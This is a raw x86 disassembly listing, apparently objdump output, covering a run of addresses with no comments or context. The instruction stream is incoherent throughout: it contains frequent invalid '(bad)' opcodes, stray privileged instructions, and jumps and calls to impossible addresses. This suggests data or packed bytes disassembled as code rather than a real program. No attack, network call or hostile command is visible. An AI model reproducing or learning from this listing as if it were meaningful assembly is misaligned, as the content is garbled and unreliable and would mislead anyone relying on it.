  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
